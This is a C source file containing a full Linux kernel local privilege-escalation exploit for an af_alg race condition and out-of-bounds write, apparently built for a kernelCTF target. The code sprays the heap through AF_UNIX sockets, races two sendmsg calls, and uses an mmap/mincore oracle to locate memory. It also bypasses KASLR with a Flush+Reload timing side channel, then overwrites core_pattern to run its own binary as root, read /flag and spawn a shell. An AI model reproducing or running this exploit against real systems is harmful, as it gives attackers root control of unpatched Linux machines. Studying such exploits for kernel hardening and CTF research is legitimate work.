/*
 * Exploit for CVE-2025-39964 — Linux af_alg out-of-bounds write (mitigation-v4-6.6)
 *
 * Vulnerability: af_alg_sendmsg() has a race condition allowing two concurrent
 * sendmsg calls to produce ctx->merge=1 with sgl->cur=0 simultaneously.
 * In this state the merge branch computes sg = sgl->sg + sgl->cur - 1 = sg[-1],
 * which is an out-of-bounds read into the previous heap chunk.  The sg[-1].page_link
 * value from the previous chunk controls the destination of memcpy_from_msg(),
 * giving an arbitrary kernel write primitive.
 *
 * Exploit chain (mitigation-v4-6.6):
 *  1. Spray 0x100 AF_UNIX socket pairs; each thread sends a crafted msghdr whose
 *     msg_control (payload[]) lands in the heap slot just before an af_alg_tsgl.
 *     payload[PAYLOAD_OFFS_TARGET] controls sg[-1].page_link = write destination.
 *  2. Set up an AF_ALG socket (AES-CBC); advance sgl->cur to MAX_SGL_ENTS-1 = 125
 *     using 1 sendmsg + SGL_MERGE_ITERATIONS send/recv pairs + 1 more send.
 *  3. Fork two children that race: one sets ctx->merge=1 (sgl->cur→MAX_SGL_ENTS),
 *     the other allocates a new sgl (sgl->cur→0) via an invalid userspace pointer.
 *  4. With ctx->merge=1 and sgl->cur=0, the next sendmsg triggers the OOB write
 *     to the address derived from payload[PAYLOAD_OFFS_TARGET].
 *  5. Map [SCAN_START_ADDR, SCAN_END_ADDR) in MAP_CHUNK_SIZE (2 GB) chunks so the OOB write
 *     destination (which wraps into userspace due to page_link arithmetic) falls
 *     in a mapped region.  An 8-step binary search (oracle = send() return value)
 *     narrows the target to a ~340 MB window; mincore then locates the exact page.
 *  6. Adjust the write destination via page_link arithmetic to point to the
 *     core_pattern kernel symbol, then write "|/proc/%P/fd/666 %P".
 *  7. A forked child watches for core_pattern to change, then faults (NULL deref),
 *     causing the kernel to execute our binary as root via core_pattern.
 *  8. Re-exec reads /flag via pidfd_getfd() on the parent's stdio descriptors.
 */

#define _GNU_SOURCE
#include <sched.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/resource.h>
#include <sys/uio.h>
#include <sys/mman.h>
#include <pthread.h>
#include <err.h>
#include <sys/sendfile.h>
#ifndef SYS_pidfd_getfd
#define SYS_pidfd_getfd 438
#endif

#ifndef SYS_pidfd_open
#define SYS_pidfd_open 434
#endif

size_t vmemmap_base = 0xffffea0000000000ULL;
size_t page_offset_base = 0xffff888000000000ULL;
size_t core_pattern = 0xffffffff8420d520ULL;

/* Socket options */
#define ALG_SET_KEY 1
#define ALG_SET_IV 2
#define ALG_SET_OP 3
#define ALG_SET_AEAD_ASSOCLEN 4
#define ALG_SET_AEAD_AUTHSIZE 5
#define ALG_SET_DRBG_ENTROPY 6
#define ALG_SET_KEY_BY_KEY_SERIAL 7

/* Operations */
#define ALG_OP_DECRYPT 0
#define ALG_OP_ENCRYPT 1

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;
typedef char i8;
typedef short i16;
typedef int i32;
typedef long long i64;
#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))

#define __u32 uint32_t
#define __u16 uint16_t
#define __u8 uint8_t
#define PAUSE           \
	{                   \
		int x;          \
		printf(":");    \
		read(0, &x, 1); \
	}

#define SYSCHK(x) ({              \
	typeof(x) __res = (x);        \
	if (__res == (typeof(x))-1)   \
		err(1, "SYSCHK(" #x ")"); \
	__res;                        \
})

#ifndef SYS_process_vm_readv
#define SYS_process_vm_readv 310
#endif

/* Number of AF_UNIX pairs to spray; one pair per exploit thread */
#define THREAD_NUM 0x100

/*
 * Size of each private anonymous mapping used as the OOB write oracle region:
 * 512 PTEs per page * PAGE_SIZE = 2 MB physical coverage per mmap entry.
 */
#define MMAP_REGION_LEN (0x1000 / 8 * 0x1000)

/*
 * Start of the contiguous userspace region we map for the binary-search oracle.
 * We start just above the 4 GB boundary to avoid the low userspace region.
 */
#define SCAN_START_ADDR 0x100000000ULL

/* Maximum number of mincore windows tried during the page-address scan */
#define MAX_SCAN_ITERATIONS 0x50

/*
 * Unmapped address passed as invalid user pointer to trigger the race condition:
 * the first 4 MB of virtual address space (0–0xfff000) is always unmapped.
 */
#define INVALID_USER_ADDR ((void *)0xfff000)

/*
 * Byte offset of sg[-1].page_link inside the sprayed msg_control payload:
 *   af_alg_tsgl is allocated in a 4096-byte slab object.
 *   sgl->sg[0] starts at byte 24 (sizeof(af_alg_tsgl)).
 *   sg[-1] = sgl->sg[-1] lies 32 bytes (sizeof(scatterlist)) before sg[0],
 *   i.e. at byte 24 - 32 = -8 relative to the tsgl object start.
 *   In the *previous* 4096-byte heap object that is offset 4096 - 8 = 0xff8.
 *   scatterlist.page_link is the first field (offset 0), so payload[0xff8]
 *   directly controls the page_link that the OOB write uses as its destination.
 */
#define PAYLOAD_OFFS_TARGET 0xff8

/*
 * Number of send/recv iterations to advance sgl->cur from 1 to 124 (MAX_SGL_ENTS-2).
 * MAX_SGL_ENTS = (4096 - sizeof(af_alg_tsgl)) / sizeof(scatterlist) - 1
 *              = (4096 - 24) / 32 - 1 = 126.
 * One initial sendmsg sets cur=1; SGL_MERGE_ITERATIONS send+recv pairs bring it
 * to 1 + 0x7b = 124; one more send brings it to 125 = MAX_SGL_ENTS - 1.
 */
#define SGL_MERGE_ITERATIONS 0x7b

/* Compile-time unslid base of kernel text (_stext); used when computing symbol offsets */
#define KERNEL_TEXT_BASE 0xffffffff81000000UL

/*
 * KASLR-invariant offset of core_pattern from _stext in mitigation-v4-6.6.
 * core_pattern is at 0xffffffff83db3720; _stext is at KERNEL_TEXT_BASE.
 */
#define CORE_PATTERN_MIT_OFFSET (0xffffffff83db3720UL - KERNEL_TEXT_BASE)

/*
 * The mitigation kernel's physmap base is shifted up by 4 GB relative to
 * LTS/COS.  This additional page_link adjustment (4 GB / 64 = 0x4000000)
 * is applied statically rather than via a runtime environment variable.
 */
#define MITIGATION_PHYSMAP_EXTRA_OFFSET (0x100000000ULL >> 6)

/* Upper bound of the userspace oracle scan region [SCAN_START_ADDR, SCAN_END_ADDR) */
#define SCAN_END_ADDR 0x500000000000ULL

/* Size of each anonymous 2 GB mmap chunk used to cover the oracle region */
#define MAP_CHUNK_SIZE 0x80000000ULL

#ifndef PAGE_SIZE
#define PAGE_SIZE 0x1000
#endif
/* Page offset mask for within-page alignment (PAGE_SIZE - 1) */
#define PAGE_MASK (PAGE_SIZE - 1)

pthread_t tid[THREAD_NUM];

/* Shared scratch buffer used by spray threads and the main exploit loop */
char buf[0x10000];
char vec[0x100000];

int cfd[2];
int sfd[THREAD_NUM][2];
char payload[0x1000];
int opfd;

struct sockaddr_alg
{
	__u16 salg_family;
	__u8 salg_type[14];
	__u32 salg_feat;
	__u32 salg_mask;
	__u8 salg_name[64];
};

void set_cpu(int i)
{
	cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(i, &mask);
	sched_setaffinity(0, sizeof(mask), &mask);
}

void *spray_send_thread(void *x)
{
	size_t idx = (size_t)x;
	write(cfd[0], buf, 1);
	read(cfd[0], buf, 1);
	struct iovec iov = {buf, 0x1000};
	struct msghdr mhdr = {
		.msg_iov = &iov,
		.msg_iovlen = 1,
		.msg_control = payload,
		.msg_controllen = 0x1000};
	while (1)
	{
		sendmsg(sfd[idx][1], &mhdr, 0);
		write(cfd[0], buf, 1);
		read(cfd[0], buf, 1);
	}
}

/*
 * Step 1: Spray THREAD_NUM AF_UNIX socket pairs, each sending a crafted msghdr
 * whose msg_control buffer (payload[]) will occupy the heap slot immediately
 * preceding an af_alg_tsgl allocation.  payload[PAYLOAD_OFFS_TARGET] then
 * aliases sg[-1].page_link and controls the OOB write destination.
 */
void spray_unix_sockets()
{
	memset(payload, 'a', 0x1000);
	struct cmsghdr *first;
	first = (struct cmsghdr *)payload;
	first->cmsg_len = 0x1000;
	first->cmsg_level = 0; /* must differ from SOL_SOCKET=1 to skip cmsg processing */
	first->cmsg_type = 0x41414141; /* dummy filler value */
	/* Initially zero; the binary search will update this to guide the OOB write */
	*(size_t *)&payload[PAYLOAD_OFFS_TARGET] = 0;

	for (int i = 0; i < THREAD_NUM; i++)
	{
		SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, sfd[i]));
		int n = 0x800;
		setsockopt(sfd[i][1], SOL_SOCKET, SO_SNDBUF, (char *)&n, sizeof(n));
		setsockopt(sfd[i][0], SOL_SOCKET, SO_RCVBUF, (char *)&n, sizeof(n));
		write(sfd[i][1], buf, 0x1000);
	}

	for (int i = 0; i < THREAD_NUM; i++)
		pthread_create(&tid[i], 0, spray_send_thread, (void *)(size_t)i);

	for (int i = 0; i < THREAD_NUM; i++)
		read(cfd[1], buf, 1);
}

/*
 * Step 5a: Map the full userspace range [SCAN_START_ADDR, SCAN_END_ADDR) with
 * physical pages in MAP_CHUNK_SIZE (2 GB) chunks.  When sg[-1].page_link is crafted
 * with a value near 0, the kernel's page_address() computation wraps around and the
 * OOB write destination lands somewhere within this region.  Mapping real pages here
 * means the write silently succeeds (our oracle), letting us binary-search for the
 * exact physical page by progressively munmap-ing halves of this range.
 */
void allocate_map()
{
	char *start = (void *)SCAN_START_ADDR;
	while (1)
	{
		start = SYSCHK(mmap(start, MAP_CHUNK_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANON | MAP_FIXED, -1, 0));
		start += MAP_CHUNK_SIZE;
		if ((size_t)start >= SCAN_END_ADDR)
			break;
	}
}

/*
 * Step 5b: Use mincore to find the exact virtual address in [start, start+4GB)
 * that corresponds to the physical page the OOB write targets.  A page marked
 * resident (mincore bit = 1) that also contains our spray marker ('a') is the
 * hit: it is the page that the kernel's arbitrary-write wrote into.
 */
size_t search_offset(char *start)
{
	char *pvec = NULL;
	for (int i = 0; i < MAX_SCAN_ITERATIONS; i++)
	{
		mincore((void *)start, 0x100000000ULL, vec);
		pvec = memchr(vec, 1, 0x100000);
		if (pvec)
		{
			char *leak_offset = start + (pvec - vec) * 0x1000;
			pvec = memchr((void *)leak_offset, 'a', 0x1000);
			if (pvec)
				break;
		}
		start += 0x100000000ULL;
	}
	if (pvec == NULL)
		exit(0);
	printf("\npvec %p %x\n", pvec, pvec[0]);
	return (size_t)pvec;
}

int check_core()
{
	/* Check if /proc/sys/kernel/core_pattern has been overwritten */
	char core_pattern_buf[0x100] = {};
	int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
	read(core, core_pattern_buf, sizeof(core_pattern_buf));
	close(core);
	return strncmp(core_pattern_buf, "|/proc/%P/fd/666", 0x10) == 0;
}

void crash(char *cmd)
{
	int memfd = memfd_create("", 0);
	/* send our binary to memfd for core_pattern payload */
	SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
	/* our binary now at file descriptor 666 */
	dup2(memfd, 666);
	close(memfd);
	while (check_core() == 0)
		sleep(1);
	puts("Root shell !!");
	/* Trigger program crash and cause kernel to execute program from core_pattern which is our "root" binary */
	*(size_t *)0 = 0;
}

size_t bypass_kaslr(u64 base);

int guess_addr(size_t guesss)
{
	for (int i = 0; i < THREAD_NUM; i++)
	{
		read(sfd[i][0], buf, 0x1000);
		read(cfd[1], buf, 1);
	}
	*(size_t *)&payload[PAYLOAD_OFFS_TARGET] = guesss;
	write(cfd[1], buf, 0x100);
	buf[0] = 'b';
	int x = send(opfd, buf, 1, MSG_MORE);
	printf("x: %d\n", x);
	return x == 1;
}

int trigger_exploit();
int main(int argc, char **argv)
{

	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	puts("Exploit start");
	if (argc == 1)
	{
		size_t stext = 0;
		if (getenv("KTEXT"))
			stext = strtoull(getenv("KTEXT"), 0, 16);
		else
			stext = bypass_kaslr(0);
		/* core_pattern symbol is at a fixed offset from _stext */
		core_pattern = stext + CORE_PATTERN_MIT_OFFSET;
		printf("got stext 0x%zx 0x%zx\n", stext, core_pattern);
	}

	struct rlimit rlim = {
		.rlim_cur = 0xf000,
		.rlim_max = 0xf000};
	setrlimit(RLIMIT_NOFILE, &rlim);

	if (argc > 1)
	{
#define SYS_pidfd_getfd 438
		int pid = strtoull(argv[1], 0, 10);
		int pfd = syscall(SYS_pidfd_open, pid, 0);
		int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
		int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
		int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
		dup2(stdinfd, 0);
		dup2(stdoutfd, 1);
		dup2(stderrfd, 2);
		/* Run cat /flag multiple times to ensure output is flushed before reboot */
		for (int i = 0; i < 6; i++)
			system("cat /flag");

		system("cat /flag;echo o>/proc/sysrq-trigger");
		execlp("bash", "bash", NULL);
	}
	/* Step 7: fork a watcher that polls core_pattern and triggers crash once overwritten */
	if (fork() == 0)
	{
		set_cpu(0);
		setsid();
		crash("");
	}
	/* Retry loop: trigger_exploit() may fail the race; restart on failure */
	while (1)
	{
		if (fork() == 0)
		{
			trigger_exploit();
			exit(0);
		}
		wait(NULL);
	}
}

int trigger_exploit()
{
	int tfmfd;

	set_cpu(1);
	SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, cfd));

	/* Step 1: spray heap with crafted msg_control buffers */
	spray_unix_sockets();

	char *addr = SYSCHK(mmap(0, MMAP_REGION_LEN, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0));
	struct iovec local = {.iov_base = addr, .iov_len = MMAP_REGION_LEN};
	struct iovec remote = {.iov_base = addr, .iov_len = MMAP_REGION_LEN};

	struct sockaddr_alg sa = {
		.salg_family = AF_ALG,
		.salg_type = "skcipher", /* symmetric key cipher */
		.salg_name = "cbc(aes)", /* AES in CBC mode */
	};

	/* Step 2: create and bind the AF_ALG transformation socket */
	tfmfd = socket(AF_ALG, SOCK_SEQPACKET, 0);
	if (tfmfd == -1)
	{
		perror("socket");
		return 1;
	}

	if (bind(tfmfd, (struct sockaddr *)&sa, sizeof(sa)) != 0)
	{
		perror("bind");
		close(tfmfd);
		return 1;
	}

	unsigned char key[32] = {0};
	if (setsockopt(tfmfd, SOL_ALG, ALG_SET_KEY, key, sizeof(key)) != 0)
	{
		perror("setsockopt");
		close(tfmfd);
		return 1;
	}

	opfd = accept(tfmfd, NULL, 0);
	if (opfd == -1)
	{
		perror("accept");
		close(tfmfd);
		return 1;
	}

	int val = 0x1000;

	struct
	{
		struct cmsghdr cmsg;
		__u32 op;
		__u32 ivlen;
		unsigned char iv[16];
	} __attribute__((__packed__)) msg;

	memset(&msg, 0, sizeof(msg));
	msg.cmsg.cmsg_level = SOL_ALG;
	msg.cmsg.cmsg_type = ALG_SET_OP;
	msg.cmsg.cmsg_len = CMSG_LEN(sizeof(__u32) + sizeof(__u32) + 16);

	msg.op = ALG_OP_ENCRYPT;
	msg.ivlen = 16;
	memset(msg.iv, 0x01, 16);

	struct iovec iov = {
		.iov_base = buf,
		.iov_len = 0x1000,
	};

	struct msghdr msgh;
	memset(&msgh, 0, sizeof(msgh));
	msgh.msg_iov = &iov;
	msgh.msg_iovlen = 1;
	msgh.msg_control = &msg;
	msgh.msg_controllen = msg.cmsg.cmsg_len;

	/* Step 3: initial sendmsg to initialise the tsgl; advances sgl->cur to 1 */
	ssize_t n = sendmsg(opfd, &msgh, MSG_MORE);
	printf("init %ld\n", n);

	/*
	 * Step 3 (cont): advance sgl->cur from 1 to 124 (MAX_SGL_ENTS - 2) using
	 * SGL_MERGE_ITERATIONS = 0x7b send+recv pairs.  Each send allocates one sg
	 * entry (cur++); each recv drains the processed entry so the socket stays
	 * writable.  The loop comment in the original PR is:
	 *   "the loop with 0x7b + the sendmsg and send calls executes 125 times,
	 *    matching MAX_SGL_ENTS - 1 = 126 - 1 = 125."
	 */
	for (int i = 0; i < SGL_MERGE_ITERATIONS; i++)
	{
		SYSCHK(send(opfd, buf, 0x1000, MSG_MORE));
		n = recv(opfd, buf, 0x1000, 0);
	}

	/* Advance sgl->cur to 125 = MAX_SGL_ENTS - 1 (one slot before the list is full) */
	send(opfd, buf, 0x1000, MSG_MORE);
	SYSCHK(setsockopt(opfd, SOL_SOCKET, SO_SNDBUF, &val, sizeof(val)));
	printf("setsockopt done\n");

	/*
	 * Step 3 (race): fork two children that race each other:
	 *
	 *   Child A (send invalid addr): passes INVALID_USER_ADDR, which causes
	 *     af_alg_alloc_tsgl() to allocate a new tsgl (sgl->cur → 0) then fail
	 *     in memcpy_from_msg() — leaving ctx->merge = 1 and sgl->cur = 0.
	 *
	 *   Child B (send 0x200 bytes): sends a sub-page-size buffer so that
	 *     ctx->merge is set to 1 and sgl->cur advances to MAX_SGL_ENTS = 126.
	 *
	 * Desired outcome: both children finish such that ctx->merge == 1 AND the
	 * last tsgl has sgl->cur == 0.  The next send() will then use sg[-1].
	 */
	if (fork() == 0)
	{
		/* Child A: trigger new-tsgl allocation then fail — sets sgl->cur = 0 */
		int x = send(opfd, INVALID_USER_ADDR, 0x400, MSG_MORE);
		printf("send3 %d\n", x);
		exit(0);
	}

	if (fork() == 0)
	{
		/* Child B: sub-page send sets ctx->merge = 1 and fills sgl->cur to MAX_SGL_ENTS */
		int x = send(opfd, buf, 0x200, MSG_MORE);
		printf("send2 %d\n", x);
		exit(0);
	}

	/*
	 * @sleep(desc="wait for both fork children to reach their send() calls and
	 *  set ctx->merge=1 with sgl->cur=0 before we recv()")
	 */
	sleep(1);
	n = recv(opfd, buf, 0x1000, 0);
	printf("recv2 %ld\n", n);
	wait(NULL);

	/* Step 4: release spray threads so they re-send their crafted payloads */
	for (int i = 0; i < THREAD_NUM; i++)
	{
		write(cfd[1], buf, 1);
	}

	n = recv(opfd, buf, 0x1000, 0);
	printf("recv2 %ld\n", n);

	memset(buf, 'z', 0x1000);
	wait(NULL);

	/* Step 5: map userspace oracle region for the binary search */
	allocate_map();

	/* Step 5 (OOB trigger): with ctx->merge=1 and sgl->cur=0 this send uses
	 * sg[-1].page_link from our sprayed payload — triggering the OOB write.
	 * Returns -1 if the write destination is unmapped (race failed); 1 if mapped. */
	int x = send(opfd, buf, 1, MSG_MORE);

	if (x == 1)
	{
		puts("Race fail");
		exit(0);
	}

	/*
	 * Step 5 (binary search oracle):
	 *
	 * Background:
	 *   sg[-1].page_link is effectively a pointer to a struct page in vmemmap.
	 *   The kernel computes the write destination as:
	 *     dest = page_address(sg_page(sg)) + sg->offset + sg->length
	 *          = page_offset_base + (page_link - vmemmap_base) / 64 * PAGE_SIZE
	 *            + offset + length
	 *   With page_link ≈ 0, the pfn arithmetic wraps to a very large value, and
	 *   (page_offset_base + pfn * PAGE_SIZE) wraps further to land within our
	 *   userspace oracle region [SCAN_START_ADDR, SCAN_END_ADDR).
	 *
	 * Oracle:
	 *   send() returns 1  → the write destination is in a mapped page (success).
	 *   send() returns -1 → the destination is unmapped (copy_from_user failed).
	 *   By progressively munmap-ing halves of the oracle region we can determine
	 *   which physical page corresponds to the OOB write target.
	 *
	 * Binary search (8 iterations → narrows range from SCAN_END_ADDR to ~340 MB):
	 *   Each iteration j tests: "if I decrease page_link by half_range/64, does
	 *   the write still succeed?"
	 *     - Decreasing page_link by Δ shifts dest by Δ*64 bytes (since each
	 *       struct-page unit = 64 bytes = one PAGE_SIZE/64 step in physmap).
	 *     - The test delta (SCAN_END_ADDR >> (7+j)) in page_link units equals
	 *       half_range = (SCAN_END_ADDR >> (1+j)) in dest-address units.
	 *   If the shifted oracle still succeeds → dest is in the *upper* half →
	 *   unmap the lower half and advance start.
	 *   Otherwise → dest is in the *lower* half → unmap the upper half.
	 */
	size_t oracle;
	size_t leak_offset = 0;
	int xcnt = 0;
	for (int k = 0; k < MAX_SCAN_ITERATIONS; k++)
	{
		for (int i = 0; i < THREAD_NUM; i++)
		{
			read(sfd[i][0], buf, 0x1000);
			read(cfd[1], buf, 1);
		}
		*(size_t *)&payload[PAYLOAD_OFFS_TARGET] -= (SCAN_END_ADDR >> 6);
		write(cfd[1], buf, 0x100);
		buf[0] = 'a';
		x = send(opfd, buf, 1, MSG_MORE);
		if (x == 1)
		{
			puts("");
			xcnt++;
			oracle = *(size_t *)&payload[PAYLOAD_OFFS_TARGET];
			char *start = (void *)(0ULL);
			for (int j = 0; j < 8; j++)
			{
				printf("loop j: %d\n", j);
				x = guess_addr(oracle - (SCAN_END_ADDR >> (7 + j)));
				if (x == 1)
				{
					xcnt++;
					start += (SCAN_END_ADDR >> (1 + j)); /* upper half */
					munmap(start - (SCAN_END_ADDR >> (1 + j)), (SCAN_END_ADDR >> (1 + j)));
				}
				else
				{
					munmap(start + (SCAN_END_ADDR >> (1 + j)), (SCAN_END_ADDR >> (1 + j)));
				}
			}
			*(size_t *)&payload[PAYLOAD_OFFS_TARGET] = oracle;
			/* search_offset returns the exact userspace VA of the OOB-written page */
			leak_offset = search_offset(start) + xcnt;
			printf("leak_offset %zx\n", leak_offset);
			printf("%zx\n", *(size_t *)&payload[PAYLOAD_OFFS_TARGET]);

			break;
		}
	}

	if (leak_offset == 0)
		exit(0);

	for (int i = 0; i < THREAD_NUM; i++)
	{
		read(sfd[i][0], buf, 0x1000);
		read(cfd[1], buf, 1);
	}
	*(size_t *)&payload[PAYLOAD_OFFS_TARGET] = oracle;
	write(cfd[1], buf, 0x100);

	/*
	 * Step 6: redirect the OOB write to core_pattern.
	 *
	 * leak_offset is the VA of the currently-targeted physical page.
	 * core_pattern is the KASLR-adjusted kernel VA of core_pattern[].
	 *
	 * First, align within-page: send adjust_offset bytes so that after the
	 * advance the write starts at the same within-page offset as core_pattern.
	 */
	size_t adjust_offset = PAGE_SIZE + (core_pattern & PAGE_MASK) - (leak_offset & PAGE_MASK);
	leak_offset += adjust_offset;
	
	memset(buf,'z',0x1000);
	SYSCHK(send(opfd, buf, adjust_offset-1, MSG_MORE));
	SYSCHK(send(opfd, buf, 1, MSG_MORE));
	
	printf("sg->len overflow check %x\n",*(char*)(leak_offset-1));
	if(*(char*)(leak_offset-1) != 'z')
		leak_offset -= 0x100000000ULL;	

	for (int i = 0; i < THREAD_NUM; i++)
	{
		read(sfd[i][0], buf, 0x1000);
		read(cfd[1], buf, 1);
	}

	/*
	 * Now adjust payload[PAYLOAD_OFFS_TARGET] (= sg[-1].page_link) so that
	 * page_address(sg_page(sg)) points to the physical page holding core_pattern.
	 * The >> 6 converts a byte-address delta to a page_link (struct page ptr) delta:
	 *   Δpage_link = Δphys_page_addr / PAGE_SIZE * sizeof(struct_page)
	 *              = Δphys_page_addr / 4096 * 64 = Δphys_page_addr >> 6.
	 * payload[PAYLOAD_OFFS_TARGET] is sg[-1].page_link, which controls dest via
	 * the formula described in the binary search comment above.
	 */

	*(size_t *)&payload[PAYLOAD_OFFS_TARGET] += (((core_pattern & ~0xfff) - (leak_offset & ~0xfff)) >> 6);

	printf("%zx\n", *(size_t *)&payload[PAYLOAD_OFFS_TARGET]);
	write(cfd[1], buf, 0x100);
	/* Step 6 (write): send the core_pattern string; kernel copies it to core_pattern[] */
	char mcore[64] = "|/proc/%P/fd/666 %P";
	SYSCHK(send(opfd, mcore, 64, MSG_MORE));
	PAUSE;

	return 0;
}

inline __attribute__((always_inline)) uint64_t rdtsc_begin()
{
	uint64_t a, d;
	asm volatile("mfence\n\t"
				 "RDTSCP\n\t"
				 "mov %%rdx, %0\n\t"
				 "mov %%rax, %1\n\t"
				 "xor %%rax, %%rax\n\t"
				 "lfence\n\t"
				 : "=r"(d), "=r"(a)
				 :
				 : "%rax", "%rbx", "%rcx", "%rdx");
	a = (d << 32) | a;
	return a;
}

inline __attribute__((always_inline)) uint64_t rdtsc_end()
{
	uint64_t a, d;
	asm volatile(
		"xor %%rax, %%rax\n\t"
		"lfence\n\t"
		"RDTSCP\n\t"
		"mov %%rdx, %0\n\t"
		"mov %%rax, %1\n\t"
		"mfence\n\t"
		: "=r"(d), "=r"(a)
		:
		: "%rax", "%rbx", "%rcx", "%rdx");
	a = (d << 32) | a;
	return a;
}

void prefetch(void *p)
{
	asm volatile(
		"prefetchnta (%0)\n"
		"prefetcht2 (%0)\n"
		: : "r"(p));
}

size_t flushandreload(void *addr) /* row miss */
{
	size_t time = rdtsc_begin();
	prefetch(addr);
	size_t delta = rdtsc_end() - time;
	return delta;
}

/*
 * KASLR bypass via Flush+Reload side channel.
 *
 * Uncomment KASLR_BYPASS_INTEL for Intel CPUs (kernelCTF remote instances).
 * Keep commented for GitHub CI (AMD/other) to use the sliding-window variant.
 * Alternatively pass -DKASLR_BYPASS_INTEL to the compiler without touching source.
 */
// #define KASLR_BYPASS_INTEL
size_t bypass_kaslr(u64 base)
{
	if (!base)
	{
#ifdef KASLR_BYPASS_INTEL
#define OFFSET 0
#define START (0xffffffff81000000ull + OFFSET)
#define END (0xffffffffD0000000ull + OFFSET)
#define STEP 0x0000000001000000ull
		while (1)
		{
			u64 bases[7] = {0};
			for (int vote = 0; vote < ARRAY_LEN(bases); vote++)
			{
				size_t times[(END - START) / STEP] = {};
				uint64_t addrs[(END - START) / STEP];

				for (int ti = 0; ti < ARRAY_LEN(times); ti++)
				{
					times[ti] = ~0;
					addrs[ti] = START + STEP * (u64)ti;
				}

				for (int i = 0; i < 16; i++)
				{
					for (int ti = 0; ti < ARRAY_LEN(times); ti++)
					{
						u64 addr = addrs[ti];
						size_t t = flushandreload((void *)addr);
						if (t < times[ti])
						{
							times[ti] = t;
						}
					}
				}

				size_t minv = ~0;
				size_t mini = -1;
				for (int ti = 0; ti < ARRAY_LEN(times) - 1; ti++)
				{
					if (times[ti] < minv)
					{
						mini = ti;
						minv = times[ti];
					}
				}

				if (mini < 0)
				{
					return -1;
				}

				bases[vote] = addrs[mini];
			}

			int c = 0;
			for (int i = 0; i < ARRAY_LEN(bases); i++)
			{
				if (c == 0)
				{
					base = bases[i];
				}
				else if (base == bases[i])
				{
					c++;
				}
				else
				{
					c--;
				}
			}

			c = 0;
			for (int i = 0; i < ARRAY_LEN(bases); i++)
			{
				if (base == bases[i])
				{
					c++;
				}
			}
			if (c > ARRAY_LEN(bases) / 2)
			{
				base -= OFFSET;
				goto got_base;
			}

			printf("majority vote failed:\n");
			printf("base = %llx with %d votes\n", base, c);
		}
#else
#define START (0xffffffff81000000ull)
#define END (0xffffffffc0000000ull)
#define STEP 0x0000000000200000ull
#define NUM_TRIALS 9
/* largest contiguous mapped area at the beginning of _stext */
#define WINDOW_SIZE 11

		while (1)
		{
			u64 bases[NUM_TRIALS] = {0};

			for (int vote = 0; vote < ARRAY_LEN(bases); vote++)
			{
				size_t times[(END - START) / STEP] = {};
				uint64_t addrs[(END - START) / STEP];

				for (int ti = 0; ti < ARRAY_LEN(times); ti++)
				{
					times[ti] = ~0;
					addrs[ti] = START + STEP * (u64)ti;
				}

				for (int i = 0; i < 16; i++)
				{
					for (int ti = 0; ti < ARRAY_LEN(times); ti++)
					{
						u64 addr = addrs[ti];
						size_t t = flushandreload((void *)addr);
						if (t < times[ti])
						{
							times[ti] = t;
						}
					}
				}

				uint64_t max = 0;
				int max_i = 0;
				for (int ti = 0; ti < ARRAY_LEN(times) - WINDOW_SIZE; ti++)
				{
					uint64_t sum = 0;
					for (int i = 0; i < WINDOW_SIZE; i++)
					{
						sum += times[ti + i];
					}
					if (sum > max)
					{
						max = sum;
						max_i = ti;
					}
				}

				bases[vote] = addrs[max_i];
			}

			int c = 0;
			for (int i = 0; i < ARRAY_LEN(bases); i++)
			{
				if (c == 0)
				{
					base = bases[i];
				}
				else if (base == bases[i])
				{
					c++;
				}
				else
				{
					c--;
				}
			}

			c = 0;
			for (int i = 0; i < ARRAY_LEN(bases); i++)
			{
				if (base == bases[i])
				{
					c++;
				}
			}
			if (c > ARRAY_LEN(bases) / 2)
			{
				goto got_base;
			}

			printf("majority vote failed:\n");
			printf("base = %llx with %d votes\n", base, c);
		}
#endif
	}

got_base:

	printf("using kernel base %llx\n", base);

	return base;
}
